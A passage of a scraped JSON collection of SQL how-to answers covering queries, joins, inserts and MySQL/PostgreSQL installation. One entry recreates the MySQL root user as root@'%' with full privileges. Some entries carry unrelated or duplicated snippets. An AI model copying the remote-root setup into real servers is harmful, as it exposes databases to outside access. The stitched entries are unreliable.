    "description": "SELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);\nSELECT MAX(SALARY) FROM EMPLOYEES UNION SELECT MIN(SALARY) FROM EMPLOYEES;\n--Find out the name of top earner in each departments --Output has Name, Department name and max salary of the department  SELECT E.FIRST_NAME , D.DEPARTMENT_NAME, E.SALARY FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID WHERE SALARY IN(SELECT MAX(E.SALARY) FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID GROUP BY DEPARTMENT_NAME);\nSELECT firstname, MAX(salary) FROM department d LEFT OUTER JOIN employee e ON (d.department_id = e.department_id) GROUP BY department_id; \n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1379,
    "keyword": null,
    "link": null,
    "title": " how to get mysql db size",
    "description": "SELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema; \n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1380,
    "keyword": null,
    "link": null,
    "title": " how to get non distinct values in sql",
    "description": "SELECT [EmailAddress], [CustomerName] FROM [Customers] WHERE [EmailAddress] IN   (SELECT [EmailAddress] FROM [Customers] GROUP BY [EmailAddress] HAVING COUNT(*) > 1)\n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1381,
    "keyword": null,
    "link": null,
    "title": " how to get nth number in sql",
    "description": "Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nHere is the solution for 3rd highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = 3; \n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1382,
    "keyword": null,
    "link": null,
    "title": " how to get output from stored procedure in oracle",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1383,
    "keyword": null,
    "link": null,
    "title": " how to get second highest salary in each department in sql",
    "description": "SELECT E.Employers_name, E.dep_number, E.salary FROM Employers E WHERE 1 = (SELECT COUNT(DISTINCT salary)          FROM Employers B          WHERE B.salary > E.salary AND E.dep_number = B.dep_number) group by E.dep_number\n/* sql 2nd highest salary employee */ select sal, ename from emp where sal =     (         select max(sal) from emp where sal <             (select max(sal) from emp)     ) ----------------------------------------------- option 2 select * from  (     select ename, sal, dense_rank() over(order by sal desc) rank     from emp ) where rank =2;\n--Find out the name of top earner in each departments --Output has Name, Department name and max salary of the department  SELECT E.FIRST_NAME , D.DEPARTMENT_NAME, E.SALARY FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID WHERE SALARY IN(SELECT MAX(E.SALARY) FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID GROUP BY DEPARTMENT_NAME);\n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1384,
    "keyword": null,
    "link": null,
    "title": " how to get slow query log in mysql",
    "description": "SET GLOBAL slow_query_log = 'ON'\n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1385,
    "keyword": null,
    "link": null,
    "title": " how to get specific salary in sql",
    "description": "Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1386,
    "keyword": null,
    "link": null,
    "title": " how to get table current identity value in sql server",
    "description": "SELECT IDENT_CURRENT('Pets') AS Result; \n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1387,
    "keyword": null,
    "link": null,
    "title": " how to get the date diff of 2 dates in the same fieldin sql server",
    "description": "WITH Partitioned AS(\tSELECT *, ROW_NUMBER() OVER (PARTITION BY cu_id, date ORDER BY cu_id, date) AS RowNumber\tFROM @Table) SELECT \t*,\tCASE \t\tWHEN RowNumber > 1 THEN 0\t\tELSE COALESCE(DATEDIFF(DAY, (SELECT MAX(date) FROM @Table WHERE date < a.date AND cu_id = a.cu_id), a.date), 0)\tEND AS Days_betweenFROM Partitioned a\nSELECT t1.OrderNo,DATEDIFF(day,t1.LoadedStartDate,t2.LoadedStartDate) FROM UnnamedTableFromQuestion t1        INNER JOIN      UnnamedTableFromQuestion t2        on          t1.OrderNo = t2.OrderNo WHERE t1.OpNo = 1 and       t2.OpNo = 4        ////////////////////////////////////////////////////////////////  select cur.unique_id_field, cur.seq_no, cur.date_created ,    datediff(second, prv.date_created, cur.date_created) as diff_in_seconds  from yourtable as cur    join yourtable as prv      on cur.seq_no = prv.seq_no + 1;\n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1388,
    "keyword": null,
    "link": null,
    "title": " how to get the date diff on once field in sql server",
    "description": "SELECT t1.OrderNo,DATEDIFF(day,t1.LoadedStartDate,t2.LoadedStartDate) FROM UnnamedTableFromQuestion t1        INNER JOIN      UnnamedTableFromQuestion t2        on          t1.OrderNo = t2.OrderNo WHERE t1.OpNo = 1 and       t2.OpNo = 4        ////////////////////////////////////////////////////////////////  select cur.unique_id_field, cur.seq_no, cur.date_created ,    datediff(second, prv.date_created, cur.date_created) as diff_in_seconds  from yourtable as cur    join yourtable as prv      on cur.seq_no = prv.seq_no + 1;\n",
    "reg_date": "2021-10-12T09:55:54.000Z"
  },
  {
    "id": 1389,
    "keyword": null,
    "link": null,
    "title": " how to get the query of a view in oracle",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'FLEX_TRADE_AGREG', 'OWNER_NAME')  \tFROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1390,
    "keyword": null,
    "link": null,
    "title": " how to get the size of the database in postgresql",
    "description": "SELECT pg_size_pretty( pg_database_size('dbname') );\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1391,
    "keyword": null,
    "link": null,
    "title": " how to get weekday from old date in sql",
    "description": "select format(columnName, 'dddd') as WeekDay from tableName; -- SQL Server 17\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1392,
    "keyword": null,
    "link": null,
    "title": " how to get yesterday date in mysql",
    "description": "SELECT SUBDATE(NOW(),1);\nSELECT * FROM my_table WHERE created_at > DATE_SUB(NOW(), INTERVAL 1 DAY)\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1393,
    "keyword": null,
    "link": null,
    "title": " how to get yesterday date in sql",
    "description": "SELECT DATEADD(day, -1, CAST(GETDATE() AS date)) AS YesterdayDate;\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1394,
    "keyword": null,
    "link": null,
    "title": " how to give access to database in postgresql server to another user",
    "description": "GRANT permissions ON DATABASE dbname TO username;\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1395,
    "keyword": null,
    "link": null,
    "title": " how to import database in mysql by cmd",
    "description": "mysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql  Note-1: It is better to use the full path of the SQL file file.sql. Note-2: Use -R and --triggers to keep the routines and triggers of original database. \t\tThey are not copied by default. Note-3 You may have to create the (empty) database from mysql if it  \t\tdoesn't exist already and the exported SQL don't          contain CREATE DATABASE (exported with --no-create-db or -n option),          before you can import it.\n",
    "reg_date": "2021-10-12T09:55:55.000Z"
  },
  {
    "id": 1396,
    "keyword": null,
    "link": null,
    "title": " how to import large sql file in phpmyadmin in ubuntu",
    "description": "->/opt/lampp/etc/php.ini 1)increase them accordingly   post_max_size=500M upload_max_filesize=500M max_input_time = 600 memory_limit=900M max_execution_time=-1  ->in opt/lampp/etc/my.cnf max_allowed_packet=1000 innodb_log_file_size = 50M  ->phpMyAdmin\\libraries\\config.default.php $cfg['ExecTimeLimit'] = 0; ______________________________________________ 2nd method   goto lampp/phpmyadmin create two folders in the same directory namely save and upload   goto lampp/phpmyadmin/config.inc.php $cfg['UploadDir'] = '/opt/lampp/phpmyadmin/upload'; $cfg['SaveDir'] = '/opt/lampp/phpmyadmin/save';  save  and then put the large .SQL file into the upload folder  it will come under the import page automatically \nTry to import it from mysql console as per the taste of your OS.  mysql -u {DB-USER-NAME} -p {DB-NAME} < {db.file.sql path} or if it's on a remote server use the -h flag to specify the host.  mysql -u {DB-USER-NAME} -h {MySQL-SERVER-HOST-NAME} -p {DB-NAME} < {db.file.sql path}\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1397,
    "keyword": null,
    "link": null,
    "title": " how to import mysql database command line",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nmysql -u username -p new_database < data-dump.sql \nmysql>create database yourDatabaseName; mysql>use yourDatabaseName;\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1398,
    "keyword": null,
    "link": null,
    "title": " how to increase size of column in sql",
    "description": "ALTER TABLE table_name MODIFY column_name varchar(new_length);\n// for oracle verison 10 or before ALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); Code language: SQL (Structured Query Language) (sql)\n          CREATE TABLE t2 (c VARCHAR(10)); Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1399,
    "keyword": null,
    "link": null,
    "title": " how to inner join 4 tables in sql",
    "description": "# no need to use parentheses - works fine SELECT * FROM names A INNER JOIN address B ON A.personID = B.personID INNER JOIN emailAddress C ON A.personID = C.personID INNER JOIN phoneNumbers D ON A.personID = D.personID;\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1400,
    "keyword": null,
    "link": null,
    "title": " how to insert data in sql",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\n //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);\nINSERT INTO users (first_name, last_name, address, email) VALUES (&lsquo;Tester&rsquo;, &lsquo;Jester&rsquo;, &lsquo;123 Fake Street, Sheffield, United Kingdom&rsquo;, &lsquo;test@lukeharrison.dev&rsquo;);\nINSERT INTO name (...) VALUES (...) Used alongside the INSERT INTO keyword to add new values to a table. Example: Adds a new car to the cars table. INSERT INTO cars (name, model, year) VALUES ('Ford', 'Fiesta', 2010);\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1401,
    "keyword": null,
    "link": null,
    "title": " how to insert data in sql table",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n //to insert value INSERT INTO students VALUES (200, 'Jones', 101); INSERT INTO students VALUES (201, 'Smith', 101); INSERT INTO students VALUE (202, 'Lee' , 102);\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1402,
    "keyword": null,
    "link": null,
    "title": " how to insert ip address in mysql using php",
    "description": "-- `ip_address` int(4) unsigned NOT NULL INSERT INTO my_table (`ip_address`) VALUES (INET_ATON(\"127.0.0.1\")); SELECT INET_NTOA(ip_address) as ip FROM my_table; -- php <?php var_dump(ip2long('123.63.153.253'));\t-- 2067765757 var_dump(long2ip(2067765757));\t\t\t-- \"123.63.153.253\" ?>\n-- `ip_address` int(4) unsigned NOT NULL INSERT INTO my_table (`ip_address`) VALUES (INET_ATON(\"127.0.0.1\")); SELECT INET_NTOA(ip_address) as ip FROM my_table; -- php <?php $ipaddress = $_SERVER['REMOTE_ADDR'];   var_dump(ip2long('123.63.153.253'));\t-- 2067765757 var_dump(long2ip(2067765757));\t\t\t-- \"123.63.153.253\" ?>\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1403,
    "keyword": null,
    "link": null,
    "title": " how to insert multiple records at once in sql acess",
    "description": "INSERT INTO target_table ( column_name1, column_name2 ) SELECT column_name1, column_name2 FROM (SELECT tableNameColumn AS column_name1, tableNameColumn2 FROM tableName, tableName2 WHERE tableNameColumn = 3 AND tableNameColumn2 = 1  UNION ALL SELECT tableNameColumn AS column_name1, tableNameColumn2 FROM tableName, tableName2 WHERE tableNameColumn = 3 AND tableNameColumn2 = 1) AS TMP  example: INSERT INTO ProgKnowledge ( UserID, ProgramID ) SELECT UserID, ProgramID FROM (SELECT Users.ID AS UserID, Programs.ProgramID FROM Users, Programs WHERE Programs.ProgramID = 3 AND Users.ID = 1 UNION ALL SELECT Users.ID AS UserID, Programs.ProgramID FROM Users, Programs WHERE Programs.ProgramID = 4 AND Users.ID = 1)  AS add; \n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1404,
    "keyword": null,
    "link": null,
    "title": " how to insert same table data using mysql query",
    "description": "Use INSERT ... SELECT:  insert into your_table (c1, c2, ...) select c1, c2, ... from your_table where id = 1\n",
    "reg_date": "2021-10-12T09:55:56.000Z"
  },
  {
    "id": 1405,
    "keyword": null,
    "link": null,
    "title": " how to insert string variable into sqlite database",
    "description": "def create_db():     with con:         cur = con.cursor()         cur.execute(\"DROP TABLE IF EXISTS Contacts\")         cur.execute(\"CREATE TABLE Contacts (First Name TEXT, Last Name TEXT, Phone TEXT, Email TEXT);\")         cur.execute(\"INSERT INTO Contacts VALUES (?, ?, ?, ?);\", (firstname, lastname, phone, email))          ## call commit on the connection...         con.commit()\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1406,
    "keyword": null,
    "link": null,
    "title": " how to insert text into database python sqlite",
    "description": "import sqlite3  def insertVaribleIntoTable(id, name, email, joinDate, salary):     try:         sqliteConnection = sqlite3.connect('SQLite_Python.db')         cursor = sqliteConnection.cursor()         print(\"Connected to SQLite\")          sqlite_insert_with_param = \"\"\"INSERT INTO SqliteDb_developers                           (id, name, email, joining_date, salary)                            VALUES (?, ?, ?, ?, ?);\"\"\"          data_tuple = (id, name, email, joinDate, salary)         cursor.execute(sqlite_insert_with_param, data_tuple)         sqliteConnection.commit()         print(\"Python Variables inserted successfully into SqliteDb_developers table\")          cursor.close()      except sqlite3.Error as error:         print(\"Failed to insert Python variable into sqlite table\", error)     finally:         if (sqliteConnection):             sqliteConnection.close()             print(\"The SQLite connection is closed\")  insertVaribleIntoTable(2, 'Joe', 'joe@pynative.com', '2019-05-19', 9000) insertVaribleIntoTable(3, 'Ben', 'ben@pynative.com', '2019-02-23', 9500)\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1407,
    "keyword": null,
    "link": null,
    "title": " how to install mysql 8.0 windows service",
    "description": "Press CTRL+C to copy C:\\> \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\\mysqld\"           --install MySQL --defaults-file=C:\\my-opts.cnf\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1408,
    "keyword": null,
    "link": null,
    "title": " how to install mysql in ubuntu 20.04",
    "description": "## To install mysql in Ubuntu ## sudo apt install mysql-server  ## For configuration  sudo mysql_secure_installation  # For password type YES or y ... enter you password # For removing user NO or n  # For disallow login NO or n # For remove database NO or n # Reload table YES or y  ## DONE configurations ...  ## Start mysql with below command... sudo mysql -u root -p   # Enter password which you add in configurations # Now you are all done...    \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!   \nsudo apt install -f mysql-client=5.7.32-1ubuntu18.04 mysql-community-server=5.7.32-1ubuntu18.04 mysql-server=5.7.32-1ubuntu18.04\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1409,
    "keyword": null,
    "link": null,
    "title": " how to install mysql in wamp server",
    "description": "Download the latest version of wamp server from wamp server website. Run the installer, after accepting their agreement you will prompt to WAMP server location usually c:/wamp/. keep it as it is and click on next for all subsequent windows. You may ask for set your preferred browser and text-editor. leave default if you like else, change it. Finally, it will ask you to run wamp server or not. Make sure run wamp checkbox checked and click on the button below to run wamp server.\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1410,
    "keyword": null,
    "link": null,
    "title": " how to install mysql on kali linux",
    "description": "sudo apt update sudo apt install -y wget wget https://dev.mysql.com/get/mysql-apt-config_0.8.15-1_all.deb sudo dpkg -i mysql-apt-config_0.8.15-1_all.deb \t\t\tSelect <OK>  and press <Enter> key to confirm version installation. sudo apt update sudo apt install mysql-community-server \t\t\tSet root password for your MySQL database server. and confirm it \t\t\tSelect the default authentication plugin. \tWhen asked for root password, provide the password and confirm it to set. sudo systemctl enable --now mysql              You can test if the database server is working fine by creating a test database: sudo mysql -u root -p\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1411,
    "keyword": null,
    "link": null,
    "title": " how to install mysql ubuntu",
    "description": "sudo apt update sudo apt install mysql-server sudo service mysql start sudo mysql_secure_installation sudo mysql -u root   In mysql console: DROP USER 'root'@'localhost'; CREATE USER 'root'@'%' IDENTIFIED BY 'YOURPASSWORD'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;\nsudo apt update sudo apt install mysql-server sudo mysql_secure_installation\nsudo apt install mysql-server sudo mysql_secure_installation utility\napt-get install mysql-client\nsystemctl status mysql\n[mysqld]\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1412,
    "keyword": null,
    "link": null,
    "title": " how to install phpunit",
    "description": "# If the Suhosin extension is enabled, you need to  # allow execution of PHARs in your php.ini: suhosin.executor.include.whitelist = phar  # To globally install the PHAR: $ wget https://phar.phpunit.de/phpunit-6.5.phar $ chmod +x phpunit-6.5.phar $ sudo mv phpunit-6.5.phar /usr/local/bin/phpunit $ phpunit --version  # You may also use the downloaded PHAR file directly: $ wget https://phar.phpunit.de/phpunit-6.5.phar $ php phpunit-6.5.phar --version\nSELECT @@SERVERNAME AS 'Server Name'\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1413,
    "keyword": null,
    "link": null,
    "title": " how to install postgresql on wsl",
    "description": "sudo apt-get install postgresql\n",
    "reg_date": "2021-10-12T09:55:57.000Z"
  },
  {
    "id": 1414,
    "keyword": null,
    "link": null,
    "title": " how to install psql in ubuntu",
    "description": "sudo apt update sudo apt install postgresql postgresql-contrib  sudo -u postgres createuser --interactive  sudo -u postgres createdb database1\nsudo apt update sudo apt install postgresql postgresql-contrib \nsudo apt-get install postgresql\nsudo apt install postgresql postgresql-contrib \n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1415,
    "keyword": null,
    "link": null,
    "title": " how to install sql in anaconda",
    "description": "conda install -c anaconda pymssql \n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1416,
    "keyword": null,
    "link": null,
    "title": " how to install sqlite3 in python",
    "description": "pip install pysqlite3 \npip install sqlite\nif you are using python3, sqlite3 is built in into it.\n#!/usr/bin/python  import sqlite3  conn = sqlite3.connect('test.db')  print \"Opened database successfully\";\nfrom sqlalchemy import create_engineengine = create_engine('sqlite:///:memory:')dff.to_sql('mySQLtable', con = engine)sqldf = pd.read_sql('mySQLtable', con = engine)sqldf\n$chmod +x sqlite.py $./sqlite.py Open database successfully \n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1417,
    "keyword": null,
    "link": null,
    "title": " how to install sqlite3 python",
    "description": "pip install pysqlite3 \npip install db-sqlite3\npip install sqlite\n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1418,
    "keyword": null,
    "link": null,
    "title": " how to join tables in sql",
    "description": "JOINING 2 Tables in sql  SELECT X.Column_Name , Y.Column_Name2 FROM TABLES1_NAME X  INNER JOIN TABLES2_NAME Y ON X.Primary_key = Y.Foreign_key;   --FOR EXAMPLE --GET THE FIRST_NAME AND JOB_TITLE --USE EMPLOYEES AND JOBS TABLE --THE RELATIONSHIP IS JOB_ID  SELECT E.FIRST_NAME , J.JOB_TITLE FROM EMPLOYEES E INNER JOIN JOBS J ON J.JOB_ID = E.JOB_ID;  \nSELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.  LEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records  FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.    INNER JOIN : SELECT select_list From TableA A Inner Join TableB B On A.Key = B.Key   LEFT OUTER JOIN : SELECT select_list From TableA A Left Join TableB B On A.Key = B.Key  (where b.key is null)//For delete matching data    RIGTH OUTER JOIN : SELECT select_list From TableA A Right Join TableB B On A.Key = B.Key   FULL JOIN : SELECT select_list From TableA A FULL OUTER Join TableB B On A.Key = B.Key  \nSuppose we are having three table named as  Student_details Attendance_details Batch_details And we have to apply join these three tables for fetching records  Example query: select column_names from Student_detail as s join Attendance_details as a on s.s_id = a.s_id join Batch_details as b on  s.s_id = b.s_id;  Here in the above example we implemented simple join but you change it with own join requirements.\nSELECT Coloumn_Name(s) FROM Table_1, Table_2 WHERE Table_1.Primary_key = Table_2.Foreign_key;\n#Joining 2 tables: table_1 and table_1  #Select the all the columns you want to show in the final joined table. SELECT \ttable_1.column_a,     table_2.column_b #Select the first table FROM \tdatabase_name.table_1 #Select the type of join statement and second table you want to join. JOIN \tdatabase_name.table_2 #Select the related columns on which you want to join the tables. ON \ttable_1.column_a = table_2.column_b \t\n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1419,
    "keyword": null,
    "link": null,
    "title": " how to join three tables in sql using joins",
    "description": "SELECT TableA.*, TableB.*, TableC.*, TableD.* FROM TableA     JOIN TableB         ON TableB.aID = TableA.aID     JOIN TableC         ON TableC.cID = TableB.cID     JOIN TableD         ON TableD.dID = TableA.dID WHERE DATE(TableC.date)=date(now())  \n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nSuppose we are having three table named as  Student_details Attendance_details Batch_details And we have to apply join these three tables for fetching records  Example query: select column_names from Student_detail as s join Attendance_details as a on s.s_id = a.s_id join Batch_details as b on  s.s_id = b.s_id;  Here in the above example we implemented simple join but you change it with own join requirements.\n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1420,
    "keyword": null,
    "link": null,
    "title": " how to join two tables with alias",
    "description": "SELECT NAME AS \"Employee Name\" FROM PEOPLE;  SELECT p.NAME AS \"Employee Name\", s.SALARY AS \"Employee Salary\" FROM PEOPLE p JOIN SALARIES s ON p.ID = s.ID;\n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1421,
    "keyword": null,
    "link": null,
    "title": " how to know mysql user privileges on a given database?",
    "description": "SHOW GRANTS FOR 'user_name';\n",
    "reg_date": "2021-10-12T09:55:58.000Z"
  },
  {
    "id": 1422,
    "keyword": null,
    "link": null,
    "title": " how to know the character set of an oracle databes",
    "description": "SELECT * FROM nls_database_parameters WHERE PARAMETER = 'NLS_CHARACTERSET'; SELECT * FROM v$nls_parameters WHERE PARAMETER = 'NLS_CHARACTERSET'; -- NLS_CHARACTERSET for VARCHAR2, NLS_NCHAR_CHARACTERSET for NVARCHAR2 SELECT * FROM database_properties WHERE PROPERTY_NAME     IN ('NLS_CHARACTERSET', 'NLS_NCHAR_CHARACTERSET');\nselect * from database_properties where PROPERTY_NAME in ('NLS_CHARACTERSET', 'NLS_NCHAR_CHARACTERSET') \n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1423,
    "keyword": null,
    "link": null,
    "title": " how to know the sql server edition",
    "description": "SELECT @@VERSION AS 'SQL Server Version';  \nSELECT SERVERPROPERTY('productversion'), SERVERPROPERTY ('productlevel'), SERVERPROPERTY ('edition') \n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1424,
    "keyword": null,
    "link": null,
    "title": " how to list columns for particular tables in postgresql",
    "description": "SELECT *   FROM information_schema.columns  WHERE table_schema = 'your_schema'    AND table_name   = 'your_table'      ;\nselect t.table_schema,        t.table_name from information_schema.tables t inner join information_schema.columns c on c.table_name = t.table_name                                  and c.table_schema = t.table_schema where c.column_name = 'last_name'       and t.table_schema not in ('information_schema', 'pg_catalog')       and t.table_type = 'BASE TABLE' order by t.table_schema; Code has been copied\n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1425,
    "keyword": null,
    "link": null,
    "title": " how to list function in psql",
    "description": "SELECT routine_name  FROM information_schema.routines  WHERE routine_type='FUNCTION'    AND specific_schema='public'   AND routine_name LIKE 'aliasmyfunctions%';\n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1426,
    "keyword": null,
    "link": null,
    "title": " how to locate pg hba.conf file",
    "description": "SHOW hba_file; \n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1427,
    "keyword": null,
    "link": null,
    "title": " how to lock table in mysql",
    "description": "LOCK TABLE tablename WRITE;\n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1428,
    "keyword": null,
    "link": null,
    "title": " how to login to mysql as normal user in ubuntu",
    "description": "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON database_name.* TO 'newuser'@'localhost';\nmysql -u newuser -p\n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1429,
    "keyword": null,
    "link": null,
    "title": " how to login to mysql in homestead",
    "description": "MySQL Host Address: 192.168.10.10Username: homesteadPassword: secretPort: 3306\n",
    "reg_date": "2021-10-12T09:55:59.000Z"
  },
  {
    "id": 1430,
    "keyword": null,
    "link": null,
    "title": " how to lower case in sql",
    "description": "SELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\nLOWER(string);\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1431,
    "keyword": null,
    "link": null,
    "title": " how to make a select in sql",
    "description": "Select * From <<Table>>\n",
    "reg_date": "2021-10-12T09:56:00.000Z"
  },
  {
    "id": 1432,
    "keyword": null,
    "link": null,
    "title": " how to make case insensitive in sql",
